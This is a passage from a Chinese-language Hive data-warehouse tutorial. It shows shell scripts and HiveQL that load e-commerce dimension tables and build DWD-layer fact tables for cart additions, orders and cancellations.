dt=’$do_date’</p><p>group by sku_id</p><p>)</p><p>insert overwrite table ${APP}.dim_sku_full partition(dt=’$do_date’)</p><p>select</p><p>sku.id,</p><p>sku.price,</p><p>sku.sku_name,</p><p>sku.sku_desc,</p><p>sku.weight,</p><p>sku.is_sale,</p><p>sku.spu_id,</p><p>spu.spu_name,</p><p>sku.category3_id,</p><p>c3.name,</p><p>c3.category2_id,</p><p>c2.name,</p><p>c2.category1_id,</p><p>c1.name,</p><p>sku.tm_id,</p><p>tm.tm_name,</p><p>attr.attrs,</p><p>sale_attr.sale_attrs,</p><p>sku.create_time</p><p>from sku</p><p>left join spu on sku.spu_id=spu.id</p><p>left join c3 on sku.category3_id=c3.id</p><p>left join c2 on c3.category2_id=c2.id</p><p>left join c1 on c2.category1_id=c1.id</p><p>left join tm on sku.tm_id=tm.id</p><p>left join attr on sku.id=attr.sku_id</p><p>left join sale_attr on sku.id=sale_attr.sku_id;</p><p>“</p><p>dim_province_full=”</p><p>insert overwrite table ${APP}.dim_province_full partition(dt=’$do_date’)</p><p>select</p><p>province.id,</p><p>province.name,</p><p>province.area_code,</p><p>province.iso_code,</p><p>province.iso_3166_2,</p><p>region_id,</p><p>region_name</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>region_id,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)province</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>region_name</p><p>from ${APP}.ods_base_region_full</p><p>where dt=’$do_date’</p><p>)region</p><p>on province.region_id=region.id;</p><p>“</p><p>dim_coupon_full=”</p><p>insert overwrite table ${APP}.dim_coupon_full partition(dt=’$do_date’)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>coupon_dic.dic_name,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case coupon_type</p><p>when ‘3201’ then concat(‘满’,condition_amount,’元减’,benefit_amount,’元’)</p><p>when ‘3202’ then concat(‘满’,condition_num,’件打’,10*(1-benefit_discount),’折’)</p><p>when ‘3203’ then concat(‘减’,benefit_amount,’元’)</p><p>end benefit_rule,</p><p>create_time,</p><p>range_type,</p><p>range_dic.dic_name,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>create_time,</p><p>range_type,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from ${APP}.ods_coupon_info_full</p><p>where dt=’$do_date’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’32’</p><p>)coupon_dic</p><p>on ci.coupon_type=coupon_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’33’</p><p>)range_dic</p><p>on ci.range_type=range_dic.dic_code;</p><p>“</p><p>dim_activity_full=”</p><p>insert overwrite table ${APP}.dim_activity_full partition(dt=’$do_date’)</p><p>select</p><p>rule.id,</p><p>info.id,</p><p>activity_name,</p><p>rule.activity_type,</p><p>dic.dic_name,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case rule.activity_type</p><p>when ‘3101’ then concat(‘满’,condition_amount,’元减’,benefit_amount,’元’)</p><p>when ‘3102’ then concat(‘满’,condition_num,’件打’,10*(1-benefit_discount),’折’)</p><p>when ‘3103’ then concat(‘打’,10*(1-benefit_discount),’折’)</p><p>end benefit_rule,</p><p>benefit_level</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>activity_id,</p><p>activity_type,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>benefit_level</p><p>from ${APP}.ods_activity_rule_full</p><p>where dt=’$do_date’</p><p>)rule</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>activity_name,</p><p>activity_type,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time</p><p>from ${APP}.ods_activity_info_full</p><p>where dt=’$do_date’</p><p>)info</p><p>on rule.activity_id=info.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’31’</p><p>)dic</p><p>on rule.activity_type=dic.dic_code;</p><p>“</p><p>case $1 in</p><p>“dim_user_zip”)</p><p>hive -e “$dim_user_zip”</p><p>;;</p><p>“dim_sku_full”)</p><p>hive -e “$dim_sku_full”</p><p>;;</p><p>“dim_province_full”)</p><p>hive -e “$dim_province_full”</p><p>;;</p><p>“dim_coupon_full”)</p><p>hive -e “$dim_coupon_full”</p><p>;;</p><p>“dim_activity_full”)</p><p>hive -e “$dim_activity_full”</p><p>;;</p><p>“all”)</p><p>hive -e<br>“$dim_user_zip$dim_sku_full$dim_province_full$dim_coupon_full$dim_activity_full”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dim_init.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ ods_to_dim_init.sh all 2020-06-14</p><h4 id="每日装载脚本"><a href="#每日装载脚本" class="headerlink" title="每日装载脚本"></a>每日装载脚本</h4><p>（1）在hadoop102的/home/atguigu/bin目录下创建ods_to_dim.sh</p><p>[atguigu@hadoop102 bin]$ vim ods_to_dim.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## 如果是输入的日期按照取输入日期；如果没输入日期取当前时间的前一天</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>dim_user_zip=”</p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>with</p><p>tmp as</p><p>(</p><p>select</p><p>old.id old_id,</p><p>old.login_name old_login_name,</p><p>old.nick_name old_nick_name,</p><p>old.name old_name,</p><p>old.phone_num old_phone_num,</p><p>old.email old_email,</p><p>old.user_level old_user_level,</p><p>old.birthday old_birthday,</p><p>old.gender old_gender,</p><p>old.create_time old_create_time,</p><p>old.operate_time old_operate_time,</p><p>old.start_date old_start_date,</p><p>old.end_date old_end_date,</p><p>new.id new_id,</p><p>new.login_name new_login_name,</p><p>new.nick_name new_nick_name,</p><p>new.name new_name,</p><p>new.phone_num new_phone_num,</p><p>new.email new_email,</p><p>new.user_level new_user_level,</p><p>new.birthday new_birthday,</p><p>new.gender new_gender,</p><p>new.create_time new_create_time,</p><p>new.operate_time new_operate_time,</p><p>new.start_date new_start_date,</p><p>new.end_date new_end_date</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>name,</p><p>phone_num,</p><p>email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>start_date,</p><p>end_date</p><p>from ${APP}.dim_user_zip</p><p>where dt=’9999-12-31’</p><p>)old</p><p>full outer join</p><p>(</p><p>select</p><p>id,</p><p>login_name,</p><p>nick_name,</p><p>md5(name) name,</p><p>md5(phone_num) phone_num,</p><p>md5(email) email,</p><p>user_level,</p><p>birthday,</p><p>gender,</p><p>create_time,</p><p>operate_time,</p><p>‘$do_date’ start_date,</p><p>‘9999-12-31’ end_date</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.login_name,</p><p>data.nick_name,</p><p>data.name,</p><p>data.phone_num,</p><p>data.email,</p><p>data.user_level,</p><p>data.birthday,</p><p>data.gender,</p><p>data.create_time,</p><p>data.operate_time,</p><p>row_number() over (partition by data.id order by ts desc) rn</p><p>from ${APP}.ods_user_info_inc</p><p>where dt=’$do_date’</p><p>)t1</p><p>where rn=1</p><p>)new</p><p>on old.id=new.id</p><p>)</p><p>insert overwrite table ${APP}.dim_user_zip partition(dt)</p><p>select</p><p>if(new_id is not null,new_id,old_id),</p><p>if(new_id is not null,new_login_name,old_login_name),</p><p>if(new_id is not null,new_nick_name,old_nick_name),</p><p>if(new_id is not null,new_name,old_name),</p><p>if(new_id is not null,new_phone_num,old_phone_num),</p><p>if(new_id is not null,new_email,old_email),</p><p>if(new_id is not null,new_user_level,old_user_level),</p><p>if(new_id is not null,new_birthday,old_birthday),</p><p>if(new_id is not null,new_gender,old_gender),</p><p>if(new_id is not null,new_create_time,old_create_time),</p><p>if(new_id is not null,new_operate_time,old_operate_time),</p><p>if(new_id is not null,new_start_date,old_start_date),</p><p>if(new_id is not null,new_end_date,old_end_date),</p><p>if(new_id is not null,new_end_date,old_end_date) dt</p><p>from tmp</p><p>union all</p><p>select</p><p>old_id,</p><p>old_login_name,</p><p>old_nick_name,</p><p>old_name,</p><p>old_phone_num,</p><p>old_email,</p><p>old_user_level,</p><p>old_birthday,</p><p>old_gender,</p><p>old_create_time,</p><p>old_operate_time,</p><p>old_start_date,</p><p>cast(date_add(‘$do_date’,-1) as string) old_end_date,</p><p>cast(date_add(‘$do_date’,-1) as string) dt</p><p>from tmp</p><p>where old_id is not null</p><p>and new_id is not null;</p><p>“</p><p>dim_sku_full=”</p><p>with</p><p>sku as</p><p>(</p><p>select</p><p>id,</p><p>price,</p><p>sku_name,</p><p>sku_desc,</p><p>weight,</p><p>is_sale,</p><p>spu_id,</p><p>category3_id,</p><p>tm_id,</p><p>create_time</p><p>from ${APP}.ods_sku_info_full</p><p>where dt=’$do_date’</p><p>),</p><p>spu as</p><p>(</p><p>select</p><p>id,</p><p>spu_name</p><p>from ${APP}.ods_spu_info_full</p><p>where dt=’$do_date’</p><p>),</p><p>c3 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category2_id</p><p>from ${APP}.ods_base_category3_full</p><p>where dt=’$do_date’</p><p>),</p><p>c2 as</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>category1_id</p><p>from ${APP}.ods_base_category2_full</p><p>where dt=’$do_date’</p><p>),</p><p>c1 as</p><p>(</p><p>select</p><p>id,</p><p>name</p><p>from ${APP}.ods_base_category1_full</p><p>where dt=’$do_date’</p><p>),</p><p>tm as</p><p>(</p><p>select</p><p>id,</p><p>tm_name</p><p>from ${APP}.ods_base_trademark_full</p><p>where dt=’$do_date’</p><p>),</p><p>attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(‘attr_id’,attr_id,’value_id’,value_id,’attr_name’,attr_name,’value_name’,value_name))<br>attrs</p><p>from ${APP}.ods_sku_attr_value_full</p><p>where dt=’$do_date’</p><p>group by sku_id</p><p>),</p><p>sale_attr as</p><p>(</p><p>select</p><p>sku_id,</p><p>collect_set(named_struct(‘sale_attr_id’,sale_attr_id,’sale_attr_value_id’,sale_attr_value_id,’sale_attr_name’,sale_attr_name,’sale_attr_value_name’,sale_attr_value_name))<br>sale_attrs</p><p>from ${APP}.ods_sku_sale_attr_value_full</p><p>where dt=’$do_date’</p><p>group by sku_id</p><p>)</p><p>insert overwrite table ${APP}.dim_sku_full partition(dt=’$do_date’)</p><p>select</p><p>sku.id,</p><p>sku.price,</p><p>sku.sku_name,</p><p>sku.sku_desc,</p><p>sku.weight,</p><p>sku.is_sale,</p><p>sku.spu_id,</p><p>spu.spu_name,</p><p>sku.category3_id,</p><p>c3.name,</p><p>c3.category2_id,</p><p>c2.name,</p><p>c2.category1_id,</p><p>c1.name,</p><p>sku.tm_id,</p><p>tm.tm_name,</p><p>attr.attrs,</p><p>sale_attr.sale_attrs,</p><p>sku.create_time</p><p>from sku</p><p>left join spu on sku.spu_id=spu.id</p><p>left join c3 on sku.category3_id=c3.id</p><p>left join c2 on c3.category2_id=c2.id</p><p>left join c1 on c2.category1_id=c1.id</p><p>left join tm on sku.tm_id=tm.id</p><p>left join attr on sku.id=attr.sku_id</p><p>left join sale_attr on sku.id=sale_attr.sku_id;</p><p>“</p><p>dim_province_full=”</p><p>insert overwrite table ${APP}.dim_province_full partition(dt=’$do_date’)</p><p>select</p><p>province.id,</p><p>province.name,</p><p>province.area_code,</p><p>province.iso_code,</p><p>province.iso_3166_2,</p><p>region_id,</p><p>region_name</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>name,</p><p>region_id,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2</p><p>from ${APP}.ods_base_province_full</p><p>where dt=’$do_date’</p><p>)province</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>region_name</p><p>from ${APP}.ods_base_region_full</p><p>where dt=’$do_date’</p><p>)region</p><p>on province.region_id=region.id;</p><p>“</p><p>dim_coupon_full=”</p><p>insert overwrite table ${APP}.dim_coupon_full partition(dt=’$do_date’)</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>coupon_dic.dic_name,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case coupon_type</p><p>when ‘3201’ then concat(‘满’,condition_amount,’元减’,benefit_amount,’元’)</p><p>when ‘3202’ then concat(‘满’,condition_num,’件打’,10*(1-benefit_discount),’折’)</p><p>when ‘3203’ then concat(‘减’,benefit_amount,’元’)</p><p>end benefit_rule,</p><p>create_time,</p><p>range_type,</p><p>range_dic.dic_name,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>coupon_name,</p><p>coupon_type,</p><p>condition_amount,</p><p>condition_num,</p><p>activity_id,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>create_time,</p><p>range_type,</p><p>limit_num,</p><p>taken_count,</p><p>start_time,</p><p>end_time,</p><p>operate_time,</p><p>expire_time</p><p>from ${APP}.ods_coupon_info_full</p><p>where dt=’$do_date’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’32’</p><p>)coupon_dic</p><p>on ci.coupon_type=coupon_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’33’</p><p>)range_dic</p><p>on ci.range_type=range_dic.dic_code;</p><p>“</p><p>dim_activity_full=”</p><p>insert overwrite table ${APP}.dim_activity_full partition(dt=’$do_date’)</p><p>select</p><p>rule.id,</p><p>info.id,</p><p>activity_name,</p><p>rule.activity_type,</p><p>dic.dic_name,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>case rule.activity_type</p><p>when ‘3101’ then concat(‘满’,condition_amount,’元减’,benefit_amount,’元’)</p><p>when ‘3102’ then concat(‘满’,condition_num,’件打’,10*(1-benefit_discount),’折’)</p><p>when ‘3103’ then concat(‘打’,10*(1-benefit_discount),’折’)</p><p>end benefit_rule,</p><p>benefit_level</p><p>from</p><p>(</p><p>select</p><p>id,</p><p>activity_id,</p><p>activity_type,</p><p>condition_amount,</p><p>condition_num,</p><p>benefit_amount,</p><p>benefit_discount,</p><p>benefit_level</p><p>from ${APP}.ods_activity_rule_full</p><p>where dt=’$do_date’</p><p>)rule</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>activity_name,</p><p>activity_type,</p><p>activity_desc,</p><p>start_time,</p><p>end_time,</p><p>create_time</p><p>from ${APP}.ods_activity_info_full</p><p>where dt=’$do_date’</p><p>)info</p><p>on rule.activity_id=info.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ${APP}.ods_base_dic_full</p><p>where dt=’$do_date’</p><p>and parent_code=’31’</p><p>)dic</p><p>on rule.activity_type=dic.dic_code;</p><p>“</p><p>case $1 in</p><p>“dim_user_zip”)</p><p>hive -e “$dim_user_zip”</p><p>;;</p><p>“dim_sku_full”)</p><p>hive -e “$dim_sku_full”</p><p>;;</p><p>“dim_province_full”)</p><p>hive -e “$dim_province_full”</p><p>;;</p><p>“dim_coupon_full”)</p><p>hive -e “$dim_coupon_full”</p><p>;;</p><p>“dim_activity_full”)</p><p>hive -e “$dim_activity_full”</p><p>;;</p><p>“all”)</p><p>hive -e<br>“$dim_user_zip$dim_sku_full$dim_province_full$dim_coupon_full$dim_activity_full”</p><p>;;</p><p>esac</p><p>（3）增加脚本执行权限</p><p>[atguigu@hadoop102 bin]$ chmod +x ods_to_dim.sh</p><p>（4）脚本用法</p><p>[atguigu@hadoop102 bin]$ ods_to_dim.sh all 2020-06-14</p><h2 id="第9章-数仓开发之DWD层"><a href="#第9章-数仓开发之DWD层" class="headerlink" title="第9章 数仓开发之DWD层"></a>第9章 数仓开发之DWD层</h2><p>DWD层设计要点：</p><p>1）DWD层的设计依据是维度建模理论，该层存储维度模型的事实表。</p><p>2）DWD层的数据存储格式为orc列式存储+snappy压缩。</p><p>3）DWD层表名的命名规范为dwd_数据域_表名_单分区增量全量标识（inc/full）</p><h3 id="交易域加购事务事实表"><a href="#交易域加购事务事实表" class="headerlink" title="交易域加购事务事实表"></a>交易域加购事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_trade_cart_add_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_cart_add_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘商品id’,</p><p>`date_id` STRING COMMENT ‘时间id’,</p><p>`create_time` STRING COMMENT ‘加购时间’,</p><p>`source_id` STRING COMMENT ‘来源类型ID’,</p><p>`source_type_code` STRING COMMENT ‘来源类型编码’,</p><p>`source_type_name` STRING COMMENT ‘来源类型名称’,</p><p>`sku_num` BIGINT COMMENT ‘加购物车件数’</p><p>) COMMENT ‘交易域加购物车事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_trade_cart_add_inc/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）分区规划</strong></p><p><strong>3）数据装载</strong></p><p><strong>（1）数据流向</strong></p><p><strong>（2）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_trade_cart_add_inc partition (dt)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_format(create_time,’yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic.dic_name,</p><p>sku_num,</p><p>date_format(create_time, ‘yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num</p><p>from ods_cart_info_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>)ci</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’24’</p><p>)dic</p><p>on ci.source_type=dic.dic_code;</p><p><strong>（3）每日装载</strong></p><p>insert overwrite table dwd_trade_cart_add_inc partition(dt=’2020-06-15’)</p><p>select</p><p>id,</p><p>user_id,</p><p>sku_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type_code,</p><p>source_type_name,</p><p>sku_num</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.sku_id,</p><p>date_format(from_utc_timestamp(ts*1000,’GMT+8’),’yyyy-MM-dd’) date_id,</p><p>date_format(from_utc_timestamp(ts*1000,’GMT+8’),’yyyy-MM-dd HH:mm:ss’)<br>create_time,</p><p>data.source_id,</p><p>data.source_type source_type_code,</p><p>if(type=’insert’,data.sku_num,data.sku_num-old[‘sku_num’]) sku_num</p><p>from ods_cart_info_inc</p><p>where dt=’2020-06-15’</p><p>and (type=’insert’</p><p>or(type=’update’ and old[‘sku_num’] is not null and<br>data.sku_num&gt;cast(old[‘sku_num’] as int)))</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name source_type_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code=’24’</p><p>)dic</p><p>on cart.source_type_code=dic.dic_code;</p><h3 id="交易域下单事务事实表"><a href="#交易域下单事务事实表" class="headerlink" title="交易域下单事务事实表"></a>交易域下单事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_trade_order_detail_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_order_detail_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`order_id` STRING COMMENT ‘订单id’,</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘商品id’,</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`activity_id` STRING COMMENT ‘参与活动规则id’,</p><p>`activity_rule_id` STRING COMMENT ‘参与活动规则id’,</p><p>`coupon_id` STRING COMMENT ‘使用优惠券id’,</p><p>`date_id` STRING COMMENT ‘下单日期id’,</p><p>`create_time` STRING COMMENT ‘下单时间’,</p><p>`source_id` STRING COMMENT ‘来源编号’,</p><p>`source_type_code` STRING COMMENT ‘来源类型编码’,</p><p>`source_type_name` STRING COMMENT ‘来源类型名称’,</p><p>`sku_num` BIGINT COMMENT ‘商品数量’,</p><p>`split_original_amount` DECIMAL(16, 2) COMMENT ‘原始价格’,</p><p>`split_activity_amount` DECIMAL(16, 2) COMMENT ‘活动优惠分摊’,</p><p>`split_coupon_amount` DECIMAL(16, 2) COMMENT ‘优惠券优惠分摊’,</p><p>`split_total_amount` DECIMAL(16, 2) COMMENT ‘最终价格分摊’</p><p>) COMMENT ‘交易域下单明细事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_trade_order_detail_inc/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_trade_order_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(create_time, ‘yyyy-MM-dd’) date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(create_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = ‘2020-06-14’</p><p>and type = ‘bootstrap-insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-14’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p><strong>（2）每日装载</strong></p><p>insert overwrite table dwd_trade_order_detail_inc partition (dt=’2020-06-15’)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>date_format(data.create_time, ‘yyyy-MM-dd’) date_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where dt = ‘2020-06-15’</p><p>and type = ‘insert’</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt = ‘2020-06-15’</p><p>and type = ‘insert’</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = ‘2020-06-15’</p><p>and type = ‘insert’</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = ‘2020-06-15’</p><p>and type = ‘insert’</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=’2020-06-15’</p><p>and parent_code=’24’</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><h3 id="交易域取消订单事务事实表"><a href="#交易域取消订单事务事实表" class="headerlink" title="交易域取消订单事务事实表"></a>交易域取消订单事务事实表</h3><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS dwd_trade_cancel_detail_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_cancel_detail_inc</p><p>(</p><p>`id` STRING COMMENT ‘编号’,</p><p>`order_id` STRING COMMENT ‘订单id’,</p><p>`user_id` STRING COMMENT ‘用户id’,</p><p>`sku_id` STRING COMMENT ‘商品id’,</p><p>`province_id` STRING COMMENT ‘省份id’,</p><p>`activity_id` STRING COMMENT ‘参与活动规则id’,</p><p>`activity_rule_id` STRING COMMENT ‘参与活动规则id’,</p><p>`coupon_id` STRING COMMENT ‘使用优惠券id’,</p><p>`date_id` STRING COMMENT ‘取消订单日期id’,</p><p>`cancel_time` STRING COMMENT ‘取消订单时间’,</p><p>`source_id` STRING COMMENT ‘来源编号’,</p><p>`source_type_code` STRING COMMENT ‘来源类型编码’,</p><p>`source_type_name` STRING COMMENT ‘来源类型名称’,</p><p>`sku_num` BIGINT COMMENT ‘商品数量’,</p><p>`split_original_amount` DECIMAL(16, 2) COMMENT ‘原始价格’,</p><p>`split_activity_amount` DECIMAL(16, 2) COMMENT ‘活动优惠分摊’,</p><p>`split_coupon_amount` DECIMAL(16, 2) COMMENT ‘优惠券优惠分摊’,</p><p>`split_total_amount` DECIMAL(16, 2) COMMENT ‘最终价格分摊’</p><p>) COMMENT ‘交易域取消订单明细事务事实表’</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>STORED AS ORC</p><p>LOCATION ‘/warehouse/gmall/dwd/dwd_trade_cancel_detail_inc/‘</p><p>TBLPROPERTIES (‘orc.compress’ = ‘snappy’);</p><p><strong>2）数据装载</strong></p><p><strong>（1）首日装载</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_trade_cancel_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,’yyyy-MM-dd’) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(canel_time,’yyyy-MM-dd’)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from 